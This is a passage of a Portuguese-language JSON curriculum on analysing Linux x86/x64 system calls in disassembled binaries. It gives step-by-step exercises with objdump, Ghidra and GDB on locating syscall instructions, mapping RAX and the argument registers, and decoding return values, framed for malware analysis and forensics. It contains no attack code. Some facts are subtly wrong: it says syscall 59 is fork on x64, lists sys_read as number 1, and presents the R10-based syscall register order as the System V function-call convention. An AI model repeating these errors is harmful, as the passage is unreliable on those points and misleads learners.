                                  "learningObjective": "Preparar ferramentas essenciais para análise de syscalls em binários x64.",
                                  "commonMistakes": "Usar arquitetura errada (x86 em vez de x64) ou binários com libc que mascaram syscalls."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar a instrução syscall no código",
                                  "subSteps": [
                                    "Execute desassembly do binário focando em seções .text ou funções principais.",
                                    "Procure pela instrução 'syscall' (opcode 0F 05 em x64).",
                                    "Anote o endereço da syscall e o contexto ao redor (próximas/p anteriores instruções).",
                                    "Identifique blocos de código que levam à syscall.",
                                    "Marque múltiplas syscalls se presentes."
                                  ],
                                  "verification": "Instrução 'syscall' localizada e anotada com endereço.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Ferramenta de desassembly ativa",
                                    "Binário carregado"
                                  ],
                                  "tips": "Use busca por string 'syscall' ou padrões de registradores como RAX.",
                                  "learningObjective": "Localizar precisamente chamadas de sistema em Assembly x64.",
                                  "commonMistakes": "Confundir 'int 0x80' (x86) com 'syscall' (x64)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair o valor do registrador RAX antes da syscall",
                                  "subSteps": [
                                    "Trace as instruções imediatamente anteriores à syscall (até MOV para RAX).",
                                    "Identifique MOV RAX, immediate ou operações que setam RAX.",
                                    "Anote o valor hexadecimal em RAX (ex: 0x1 para write).",
                                    "Use debugger como GDB para simular e confirmar valor de RAX ('info reg rax').",
                                    "Registre o valor exato e o offset antes da syscall."
                                  ],
                                  "verification": "Valor de RAX capturado e confirmado via desassembly ou debug.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Debugger GDB ou ferramenta com stepping (Ghidra debugger)",
                                    "Desassembly anotada"
                                  ],
                                  "tips": "RAX é zerado ou setado tipicamente 1-5 instruções antes; procure 'mov $0x0, %rax'.",
                                  "learningObjective": "Entender convenção de chamada: RAX contém número da syscall em x64.",
                                  "commonMistakes": "Ler RAX após syscall (pode ser sobrescrito) ou confundir com RDI/RSI."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consultar tabela de syscalls e interpretar",
                                  "subSteps": [
                                    "Acesse tabela de syscalls x64 (ex: syscall 0=read, 1=write).",
                                    "Mapeie valor de RAX à syscall correspondente.",
                                    "Anote argumentos em RDI, RSI, RDX (para contexto).",
                                    "Verifique se é syscall comum ou avançada (ex: 59=fork).",
                                    "Documente a syscall completa: número, nome e propósito."
                                  ],
                                  "verification": "Syscall identificada corretamente com nome e descrição.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Tabela oficial de syscalls Linux x64",
                                    "Notas de RAX e registradores"
                                  ],
                                  "tips": "Use sites como https://filippo.io/linux-syscall-table/ para referência rápida.",
                                  "learningObjective": "Mapear números de syscall a funções do kernel Linux.",
                                  "commonMistakes": "Usar tabela x86 (int 0x80) em vez de x64 ou ignorar arquitetura."
                                }
                              ],
                              "practicalExample": "Em um binário 'hello.s' assembly: 'mov $1, %rax; mov $1, %rdi; mov $msg, %rsi; mov $14, %rdx; syscall' → RAX=1 é 'write' (sys_write).",
                              "finalVerifications": [
                                "Valor de RAX extraído corretamente antes de 'syscall'.",
                                "Número mapeado à syscall correta (ex: 0=read).",
                                "Contexto de argumentos (RDI/RSI/RDX) notado.",
                                "Análise repetida em 2-3 syscalls diferentes sem erros.",
                                "Documentação completa com endereços e interpretações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de RAX (100% correto).",
                                "Uso correto de tabela x64 (sem confusão com x86).",
                                "Explicação clara do processo em relatório.",
                                "Eficiência: análise completa em <1 hora.",
                                "Capacidade de debugar valores dinâmicos via GDB."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender interface kernel-user.",
                                "Programação em Assembly: Manipulação de registradores.",
                                "Reverse Engineering: Análise estática/dinâmica de binários.",
                                "Segurança: Detecção de syscalls maliciosas em malware.",
                                "Redes: Syscalls como socket() em análise de tráfego."
                              ],
                              "realWorldApplication": "Em análise de malware, extrair syscalls de binários suspeitos revela comportamentos como leitura de arquivos (/etc/passwd=read) ou criação de sockets para C2, essencial para detecção de APTs e forense digital."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.3",
                            "name": "Mapear parâmetros em registradores x64",
                            "description": "Analisar parâmetros em RDI (1º), RSI (2º), RDX (3º), R10 (4º), R8 (5º) e R9 (6º), considerando convenções de chamada rápida (fastcall).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Convenção de Chamada Rápida (Fastcall) em x64",
                                  "subSteps": [
                                    "Estude a documentação da System V ABI para x64, focando na seção de passagem de parâmetros.",
                                    "Memorize a ordem padrão: RDI (1º), RSI (2º), RDX (3º), R10 (4º), R8 (5º), R9 (6º).",
                                    "Compare com convenções x86 de 32 bits (stack-based) para destacar diferenças.",
                                    "Identifique que parâmetros adicionais vão para a stack após R9.",
                                    "Revise exemplos de chamadas de funções não-syscall para contextualizar."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a ordem dos 6 primeiros registradores e dê um exemplo simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação System V ABI x64 (PDF ou online)",
                                    "Notas de aula sobre assembly x64"
                                  ],
                                  "tips": "Use mnemônicos como 'Red Devils Run To Our Great Stadium' para lembrar RDI, RSI, RDX, R10, R8, R9.",
                                  "learningObjective": "Entender e recitar a convenção fastcall para parâmetros em registradores x64.",
                                  "commonMistakes": [
                                    "Confundir com convenção Microsoft x64 (RCX, RDX, R8, R9).",
                                    "Esquecer que RAX é para retorno, não parâmetros.",
                                    "Ignorar alinhamento de stack para params >6."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Registradores em Código Assembly x64",
                                  "subSteps": [
                                    "Abra um disassembler como objdump ou IDA Pro em um binário simples.",
                                    "Localize instruções MOV que carregam valores nos registradores RDI-R9 antes de uma syscall.",
                                    "Trace o fluxo de execução até a instrução SYSCALL ou INT 0x80 (legado).",
                                    "Anote o número do parâmetro baseado na ordem de carregamento.",
                                    "Diferencie parâmetros de syscalls de funções regulares."
                                  ],
                                  "verification": "Marque em um snippet de assembly os registradores corretos para cada parâmetro.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas: objdump, gdb, Ghidra",
                                    "Exemplos de binários com syscalls (ex: programa C compilado com open())"
                                  ],
                                  "tips": "Use 'info registers' no gdb para inspecionar valores em runtime.",
                                  "learningObjective": "Reconhecer padrões de carregamento de parâmetros em registradores antes de syscalls.",
                                  "commonMistakes": [
                                    "Confundir RDX com RCX.",
                                    "Não notar que R10 é usado em vez de RCX em System V.",
                                    "Ignorar preservação de registradores callee-saved."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Parâmetros em um Exemplo Prático de Syscall",
                                  "subSteps": [
                                    "Compile um programa C simples que chama open() e disassemble com objdump -d.",
                                    "Identifique syscall number em RAX (ex: 2 para open).",
                                    "Mapeie: pathname em RDI, flags em RSI, mode em RDX.",
                                    "Execute no gdb e use breakpoints antes da syscall para verificar registradores.",
                                    "Registre o mapeamento em uma tabela: Parâmetro | Registrador | Valor."
                                  ],
                                  "verification": "Crie uma tabela de mapeamento precisa para open() e valide com strace.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "GCC para compilar C para x64",
                                    "GDB debugger",
                                    "strace para validação",
                                    "Código fonte exemplo"
                                  ],
                                  "tips": "Use 'disassemble main' no gdb e 'x/10i $pc' para contexto.",
                                  "learningObjective": "Aplicar mapeamento em um syscall real, validando com ferramentas.",
                                  "commonMistakes": [
                                    "Usar ordem errada (ex: RSI como 1º).",
                                    "Não alinhar ponteiros em RDI/RSI.",
                                    "Confundir valores imediatos com ponteiros."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar e Verificar Mapeamento em Múltiplos Cenários",
                                  "subSteps": [
                                    "Analise syscalls com >3 params, como mmap(), mapeando até R9 e stack.",
                                    "Desafie-se com binários ofuscados ou malware samples (seguros).",
                                    "Compare mapeamento manual com output de ferramentas como pwndbg.",
                                    "Crie um checklist para análise: RAX(syscall#), RDI-R9(params), stack.",
                                    "Teste conhecimento resolvendo CTF challenges com syscalls x64."
                                  ],
                                  "verification": "Resolva 3 exemplos independentes e autoavalie acurácia >90%.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "CTF binaries ou samples de picoCTF",
                                    "Pwntools ou pwndbg",
                                    "Checklist template"
                                  ],
                                  "tips": "Automatize verificação com script Python usando Keystone para assembly.",
                                  "learningObjective": "Mapear parâmetros com fluência em cenários variados e complexos.",
                                  "commonMistakes": [
                                    "Esquecer params na stack após R9.",
                                    "Não considerar chamadas indiretas (via ptr em registrador).",
                                    "Ignorar convenções em bibliotecas dinâmicas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário disassemblado: mov rdi, 0x401200; mov rsi, 0; mov rdx, 0o666; mov rax, 2; syscall; Aqui, RDI=pathname (ptr 0x401200, 1º param), RSI=flags(O_RDONLY=0, 2º), RDX=mode(0666, 3º) para syscall open().",
                              "finalVerifications": [
                                "Lista correta dos 6 registradores: RDI, RSI, RDX, R10, R8, R9.",
                                "Mapeia precisamente params em exemplo open() usando gdb.",
                                "Identifica params na stack para syscalls >6.",
                                "Diferencia fastcall System V de Microsoft x64.",
                                "Valida mapeamento com strace ou runtime inspection.",
                                "Aplica em binário desconhecido sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de registradores (100% correto).",
                                "Compreensão de exceções (stack overflow, alinhamento).",
                                "Uso eficaz de ferramentas (gdb/objdump).",
                                "Explicação clara de raciocínio em análise.",
                                "Velocidade e confiança em exemplos variados.",
                                "Identificação de erros comuns em cenários reais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender como compiler gera código.",
                                "Sistemas Operacionais: Internais de syscalls e ABI.",
                                "Segurança Computacional: Reverse engineering de exploits/malware.",
                                "Engenharia de Software: Debugging e análise de binários.",
                                "Matemática Discreta: Representação binária e registradores."
                              ],
                              "realWorldApplication": "Em análise de malware, mapeie parâmetros de syscalls como execve() para detectar payloads; em debugging de crashes, trace args de funções; essencial para pentesters em CTFs/exploits x64 Linux."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.4",
                            "name": "Interpretar valores de retorno",
                            "description": "Examinar o registrador RAX após a syscall para valores de retorno, erros (valores negativos) e convenções de errno.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Convenções de Syscalls em x86_64 Linux",
                                  "subSteps": [
                                    "Estude a ABI do System V para x86_64, focando em registradores usados em syscalls.",
                                    "Identifique que o número da syscall vai em RAX antes da instrução 'syscall'.",
                                    "Memorize que o valor de retorno é colocado em RAX após a syscall.",
                                    "Leia sobre convenções de erro: valores positivos ou zero indicam sucesso, negativos são -errno.",
                                    "Consulte man pages como 'man 2 syscall' para exemplos."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as convenções de RAX pré e pós-syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação ABI System V x86_64 PDF",
                                    "Man pages online (syscall(2))",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use 'info registers' no GDB para visualizar RAX durante sessões práticas futuras.",
                                  "learningObjective": "Compreender o papel exato do RAX em syscalls x86_64.",
                                  "commonMistakes": "Confundir RAX com outros registradores como RDI (primeiro argumento)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Isolar Instruções Syscall em Código Assembly",
                                  "subSteps": [
                                    "Carregue um binário em um disassembler como objdump ou Ghidra.",
                                    "Procure pela instrução 'syscall' (opcode 0F 05).",
                                    "Note o valor em RAX imediatamente antes da syscall (número da syscall).",
                                    "Marque o ponto pós-syscall para análise de registradores.",
                                    "Use ferramentas como GDB para pausar execução na syscall."
                                  ],
                                  "verification": "Anote o endereço da syscall e o valor pré-syscall em RAX em um exemplo de binário.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Binário de exemplo com syscalls (ex: hello world em asm)",
                                    "GDB ou Ghidra",
                                    "objdump"
                                  ],
                                  "tips": "Filtre disassembly por 'syscall' com grep: objdump -d binary | grep syscall.",
                                  "learningObjective": "Localizar precisamente syscalls em código desmontado.",
                                  "commonMistakes": "Ignorar syscalls indiretas ou wrappers como int 0x80 (legado)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar e Decodificar Valores em RAX Pós-Syscall",
                                  "subSteps": [
                                    "Execute o binário no GDB e defina breakpoint após 'syscall'.",
                                    "Inspecione 'info registers rax' para capturar o valor retornado.",
                                    "Se RAX >= 0, interprete como bytes lidos/escritos ou handle de arquivo.",
                                    "Se RAX < 0, calcule errno absoluto: errno = -RAX, consulte /usr/include/asm-generic/errno-base.h.",
                                    "Compare com man page da syscall específica (ex: man 2 read)."
                                  ],
                                  "verification": "Para uma syscall conhecida, registre RAX e explique seu significado.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB",
                                    "Binário com syscalls como read/write",
                                    "syscall table (syscall.h)"
                                  ],
                                  "tips": "Use 'print -d $rax' no GDB para ver valor decimal de RAX.",
                                  "learningObjective": "Decodificar RAX para sucesso, falha e códigos de erro específicos.",
                                  "commonMistakes": "Interpretar valores negativos como sucesso ou ignorar convenção -errno."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Interpretação com Exemplos de Erro e Sucesso",
                                  "subSteps": [
                                    "Compile e execute asm com read syscall em arquivo inválido para forçar erro.",
                                    "Registre RAX (ex: -2 para ENOENT), mapeie para errno.",
                                    "Teste syscall bem-sucedida e compare RAX (ex: bytes lidos).",
                                    "Crie tabela de mapeamento: RAX -> Interpretação -> Man page.",
                                    "Analise binário real de malware com syscalls falhas."
                                  ],
                                  "verification": "Crie relatório de 3 syscalls: uma sucesso, duas falhas, com interpretações.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Compilador NASM/GCC",
                                    "Arquivos de teste inválidos",
                                    "Exemplos de malware desmontados"
                                  ],
                                  "tips": "Automatize com script GDB para dump de RAX pós-syscall.",
                                  "learningObjective": "Aplicar interpretação em cenários reais de análise.",
                                  "commonMistakes": "Não validar contexto da syscall (ex: argumentos em RDI/RSI)."
                                }
                              ],
                              "practicalExample": "Em um binário x86_64 Linux com syscall read (RAX=0 pré-syscall):\n- Sucesso: RAX=14 (14 bytes lidos).\n- Falha (arquivo inexistente): RAX=-2 → errno=2 (ENOENT).\nCódigo asm exemplo:\nmov rax, 0\nmov rdi, 3\nlea rsi, [buf]\nmov rdx, 100\nsyscall\n; Aqui, examine RAX.",
                              "finalVerifications": [
                                "Identifica corretamente se RAX indica sucesso ou falha.",
                                "Calcula errno corretamente de valores negativos em RAX.",
                                "Consulta man pages para interpretar retornos específicos de syscalls.",
                                "Diferencia convenções x86_64 de x86 32-bit (int 0x80).",
                                "Aplica interpretação em disassembly estático e dinâmico.",
                                "Lista pelo menos 5 errnos comuns de syscalls de arquivo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de RAX (100% correto em exemplos).",
                                "Compreensão de convenções ABI (explicação clara de pré/pós-syscall).",
                                "Uso correto de ferramentas (GDB/objdump sem erros).",
                                "Profundidade na análise de erros (mapeamento para errno e causas).",
                                "Capacidade de generalizar para syscalls não testadas.",
                                "Relatório prático com evidências (screenshots/logs GDB)."
                              ],
                              "crossCurricularConnections": [
                                "Debugging e Reverse Engineering: Uso de GDB para análise dinâmica.",
                                "Conceitos de Sistemas Operacionais: errno e handling de erros em kernel.",
                                "Segurança Computacional: Detecção de falhas em exploits/malware.",
                                "Programação em Assembly: Entendimento de registradores e ABI.",
                                "Análise Forense: Interpretação de binários em investigações."
                              ],
                              "realWorldApplication": "Em análise de malware, interpretar RAX pós-syscall revela tentativas falhas de acesso a arquivos sensíveis (ex: detecção de ransomware testando writes), auxiliando em forensics digitais e desenvolvimento de detecção de intrusões."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.5.3",
                        "name": "Análise de Syscalls em Binários Desmontados",
                        "description": "Técnicas para localizar, identificar e analisar syscalls em binários usando ferramentas de desmontagem, considerando formatos ELF.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.3.1",
                            "name": "Localizar syscalls em desmontadores",
                            "description": "Usar ferramentas como objdump, IDA Pro ou Ghidra para navegar no código desmontado e buscar padrões de int 0x80 ou syscall.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e selecionar ferramenta de desmontagem",
                                  "subSteps": [
                                    "Instale binutils (inclui objdump) via gerenciador de pacotes (apt install binutils no Linux).",
                                    "Baixe e instale Ghidra ou IDA Freeware de fontes oficiais.",
                                    "Crie uma pasta de trabalho e obtenha um binário de exemplo ELF de 32 bits (ex: compile um C simples com gcc -m32).",
                                    "Verifique a arquitetura do binário com file <binario> para confirmar x86 32-bit.",
                                    "Abra o terminal ou o software escolhido e navegue até a pasta do binário."
                                  ],
                                  "verification": "Confirme instalação executando 'objdump -v' ou abrindo Ghidra sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Binutils ou Ghidra/IDA Pro",
                                    "Binário ELF 32-bit de exemplo",
                                    "Terminal ou IDE de reverse engineering"
                                  ],
                                  "tips": "Use Ghidra para interfaces gráficas intuitivas; objdump para linha de comando rápida.",
                                  "learningObjective": "Configurar ferramentas essenciais para análise de binários desmontados.",
                                  "commonMistakes": [
                                    "Usar binário 64-bit sem -m32",
                                    "Ignorar verificação de arquitetura",
                                    "Não criar pasta dedicada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desmontar o binário e visualizar o código assembly",
                                  "subSteps": [
                                    "Execute 'objdump -d -M intel <binario>' para desmontagem em Intel syntax.",
                                    "No Ghidra: Crie projeto, importe binário, analise automaticamente e abra Listing window.",
                                    "Navegue pelas seções .text e .plt usando busca ou scroll.",
                                    "Salve a saída do objdump em um arquivo texto para referência.",
                                    "Identifique funções principais como main ou _start."
                                  ],
                                  "verification": "Visualize código assembly completo sem erros de parsing.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binário de exemplo",
                                    "Objdump ou Ghidra"
                                  ],
                                  "tips": "Use -M intel para syntax legível; em Ghidra, ative auto-análise.",
                                  "learningObjective": "Gerar e interpretar representações desmontadas de binários.",
                                  "commonMistakes": [
                                    "Desmontar binário stripped sem símbolos",
                                    "Confundir seções .data com .text",
                                    "Ignorar opções de syntax"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Navegar pelo código e buscar padrões de syscalls",
                                  "subSteps": [
                                    "Procure por 'int 0x80' (syscall Linux 32-bit antigo) usando busca (Ctrl+F no Ghidra ou grep na saída objdump).",
                                    "Busque 'syscall' instruction (x86-64 ou moderno 32-bit).",
                                    "Examine registradores EAX/RAX para número da syscall (ex: 0x3 para read).",
                                    "Rastreie chamadas em funções suspeitas como loops de I/O.",
                                    "Anote offsets/hex addresses das syscalls encontradas."
                                  ],
                                  "verification": "Liste pelo menos 2-3 ocorrências de padrões syscall com contexto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Saída desmontada",
                                    "Documentação de syscalls (man 2 syscalls)"
                                  ],
                                  "tips": "Combine busca textual com navegação por grafo de controle em Ghidra.",
                                  "learningObjective": "Reconhecer e localizar instruções de invocação de syscalls em assembly.",
                                  "commonMistakes": [
                                    "Confundir int 0x80 com interrupts de hardware",
                                    "Ignorar syscalls indiretas via PLT",
                                    "Não checar valor em EAX"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e validar syscalls localizadas",
                                  "subSteps": [
                                    "Correlacione EAX com tabela de syscalls (ex: 0x5 = open).",
                                    "Verifique argumentos em EBX, ECX, etc., para confirmar uso.",
                                    "Use strings ou xrefs em Ghidra para contexto (ex: caminhos de arquivo).",
                                    "Compare com binário conhecido (ex: /bin/ls desmontado).",
                                    "Documente em relatório: offset, syscall number, propósito provável."
                                  ],
                                  "verification": "Explique o propósito de 2 syscalls com argumentos corretos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tabela de syscalls x86",
                                    "Ghidra/Objdump"
                                  ],
                                  "tips": "Consulte kernel.org para números de syscalls por versão.",
                                  "learningObjective": "Interpretar syscalls no contexto do binário para análise funcional.",
                                  "commonMistakes": [
                                    "Assumir syscall sem validar args",
                                    "Confundir usercalls com syscalls",
                                    "Não documentar offsets"
                                  ]
                                }
                              ],
                              "practicalExample": "Desmonte /bin/cat (32-bit): Localize int 0x80 com EAX=0x3 (read) e EAX=0x4 (write) nos loops de stdin/stdout.",
                              "finalVerifications": [
                                "Localiza int 0x80/syscall em binário fornecido em <5 minutos.",
                                "Identifica corretamente 3+ syscalls com números e args.",
                                "Navega por desmontagem sem perda de contexto.",
                                "Documenta offsets e propósitos.",
                                "Diferencia syscalls de outras interrupts."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de padrões (100% match).",
                                "Eficiência de navegação e busca (<10min por binário).",
                                "Análise contextual de args e números de syscall.",
                                "Documentação clara com offsets e explicações.",
                                "Uso correto de múltiplas ferramentas."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender interface kernel-user.",
                                "Assembly x86: Sintaxe e registradores.",
                                "Engenharia Reversa: Ferramentas de análise estática.",
                                "Segurança: Detecção de chamadas maliciosas em malware."
                              ],
                              "realWorldApplication": "Em análise de malware, localizar syscalls revela comportamentos como file access ou network calls em binários suspeitos durante forensic investigations."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.2",
                            "name": "Consultar tabelas de syscalls",
                            "description": "Mapear números de syscall para nomes de funções usando referências como /usr/include/asm/unistd_32.h ou syscalls kernel.org, em contextos 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito de Syscalls e Tabelas de Referência",
                                  "subSteps": [
                                    "Estude o que são syscalls: interfaces entre user-space e kernel em sistemas Linux/Unix.",
                                    "Identifique diferenças entre arquiteturas 32-bit (syscall via int 0x80 ou sysenter) e 64-bit (syscall instruction).",
                                    "Liste fontes principais: headers locais (/usr/include/asm/unistd*.h) e syscalls.kernel.org.",
                                    "Revise exemplos básicos de syscalls comuns como sys_read (1), sys_write (4), sys_exit (60 em x86_64).",
                                    "Anote números de syscall iniciais para prática futura."
                                  ],
                                  "verification": "Crie um resumo de 5 linhas explicando syscalls e cite pelo menos 3 fontes de tabelas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "/usr/include/asm/unistd_32.h (instalar kernel-headers se necessário), syscalls.kernel.org, documentação Linux man pages"
                                  ],
                                  "tips": "Use um editor de texto para anotar; comece com x86 para familiaridade.",
                                  "learningObjective": "Compreender o papel das syscalls e identificar fontes confiáveis de mapeamento.",
                                  "commonMistakes": [
                                    "Confundir números de syscall entre 32 e 64 bits",
                                    "Ignorar dependência de arquitetura",
                                    "Usar tabelas desatualizadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Acessar e Consultar Tabelas Locais para 32-bit",
                                  "subSteps": [
                                    "Instale pacotes necessários: sudo apt install linux-headers-$(uname -r) em Debian-based.",
                                    "Localize o arquivo: find /usr/include -name 'unistd_32.h' ou similar.",
                                    "Abra o arquivo com grep ou editor: grep '#define __NR_' /usr/include/asm/unistd_32.h | head -20.",
                                    "Mapeie exemplos: identifique __NR_exit (1), __NR_read (3), etc.",
                                    "Crie uma tabela manual com 10 syscalls comuns."
                                  ],
                                  "verification": "Liste corretamente 5 mapeamentos de números para nomes de 32-bit, como 1 -> exit.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal Linux, kernel-headers package, editor de texto (vim/nano)"
                                  ],
                                  "tips": "Use 'less' ou 'grep -n' para navegação rápida no arquivo grande.",
                                  "learningObjective": "Localizar e extrair mapeamentos de syscalls de headers locais em 32-bit.",
                                  "commonMistakes": [
                                    "Não instalar headers corretos para a versão do kernel",
                                    "Confundir unistd_32.h com unistd_64.h",
                                    "Ignorar defines condicionais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Consultar Tabelas para 64-bit e Recursos Online",
                                  "subSteps": [
                                    "Localize header 64-bit: /usr/include/asm/unistd_64.h ou x86_64.",
                                    "Acesse syscalls.kernel.org: navegue para x86 e x86_64, filtre por número.",
                                    "Compare mapeamentos: note sys_exit é 60 em x86_64 vs 1 em x86.",
                                    "Use ferramentas auxiliares: cat /usr/include/asm/unistd_x86_64.h | grep exit.",
                                    "Salve capturas ou exporte tabelas para referência pessoal."
                                  ],
                                  "verification": "Forneça mapeamentos corretos para sys_write em ambas arquiteturas (4 em 32-bit, 1 em 64-bit).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Browser web, syscalls.kernel.org, headers 64-bit locais"
                                  ],
                                  "tips": "Bookmark syscalls.kernel.org por arch; use Ctrl+F para busca rápida.",
                                  "learningObjective": "Dominar consulta em 64-bit e fontes online para precisão cross-arch.",
                                  "commonMistakes": [
                                    "Assumir numeração universal",
                                    "Usar site sem especificar arch",
                                    "Não verificar versão do kernel"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Mapeamento em Binários Desmontados",
                                  "subSteps": [
                                    "Desmonte um binário simples: objdump -d /bin/ls | grep 'int 0x80' ou 'syscall'.",
                                    "Identifique número de syscall no assembly (ex: eax=0x5 para open).",
                                    "Mapeie usando tabelas consultadas: 5 -> sys_open.",
                                    "Verifique com strace: strace /bin/ls para correlacionar chamadas.",
                                    "Documente 3 exemplos de mapeamento em um relatório curto."
                                  ],
                                  "verification": "Desmonte um binário e mapeie corretamente pelo menos 3 syscalls com arch correta.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "objdump ou radare2/ghidra, strace, binários de teste como /bin/echo"
                                  ],
                                  "tips": "Teste em VM para isolamento; foque em syscalls de I/O primeiro.",
                                  "learningObjective": "Aplicar mapeamento de syscalls em análise real de binários.",
                                  "commonMistakes": [
                                    "Não detectar arch do binário (file comando)",
                                    "Confundir registradores (eax em 32 vs rax em 64)",
                                    "Ignorar sysenter vs int80"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 32-bit desmontado com objdump, encontre 'mov eax,0xb; int 0x80'. Consulte unistd_32.h ou kernel.org: 0xb mapeia para sys_execve. Verifique com strace ./binary para confirmar execução de execve('/bin/sh').",
                              "finalVerifications": [
                                "Mapeia corretamente sys_read (3 em 32-bit, 0 em 64-bit).",
                                "Distingue tabelas por arquitetura sem erros.",
                                "Localiza headers locais em qualquer distro Linux padrão.",
                                "Usa syscalls.kernel.org para syscalls obscuros.",
                                "Aplica mapeamento em output de objdump de binário real.",
                                "Correlaciona com strace para validação."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos mapeamentos (100% correto para exemplos dados).",
                                "Cobertura de ambas arquiteturas 32/64 bits.",
                                "Eficiência na localização de fontes (tempo < estimado).",
                                "Qualidade da documentação de mapeamentos (tabelas claras).",
                                "Aplicação prática em binário desmontado sem erros.",
                                "Identificação de erros comuns e avoidance."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: Interpretação de registradores como EAX/RAX.",
                                "Sistemas Operacionais: Entendimento de kernel interfaces.",
                                "Engenharia Reversa: Uso em ferramentas como IDA Pro/Ghidra.",
                                "Segurança: Detecção de syscalls maliciosas em malware.",
                                "Programação em C: Implementação de syscalls wrappers."
                              ],
                              "realWorldApplication": "Em análise forense de malware, mapear syscalls em binários desmontados revela comportamentos como network access (sys_socket) ou file hiding (sys_open com flags), essencial para threat hunting e desenvolvimento de signatures em ferramentas como YARA."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.3",
                            "name": "Rastrear fluxo de parâmetros dinamicamente",
                            "description": "Seguir o fluxo de dados desde loads em memória ou registradores até os argumentos da syscall, identificando strings ou ponteiros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar a instrução de syscall no desassembly",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de desassembly como Ghidra, IDA Pro ou radare2.",
                                    "Procure por instruções como 'syscall' (x86_64) ou 'int 0x80' (x86 32-bit).",
                                    "Anote o número da syscall em registrador como RAX/EAX (ex: 59 para execve).",
                                    "Liste as funções ou blocos de código que levam à syscall.",
                                    "Use cross-references para ver chamadores."
                                  ],
                                  "verification": "Confirme que localizou a syscall correta comparando o número em RAX com a tabela de syscalls do kernel (man syscalls).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de desassembly (Ghidra/IDA/radare2)",
                                    "Tabela de syscalls Linux (syscall.h ou online)"
                                  ],
                                  "tips": "Comece pela main() ou funções suspeitas; filtre por strings como 'open', 'execve'.",
                                  "learningObjective": "Localizar precisamente instruções de syscall em binários desmontados.",
                                  "commonMistakes": [
                                    "Confundir syscalls com funções de libc",
                                    "Ignorar syscalls indiretas via ponteiros"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear registradores de parâmetros da syscall",
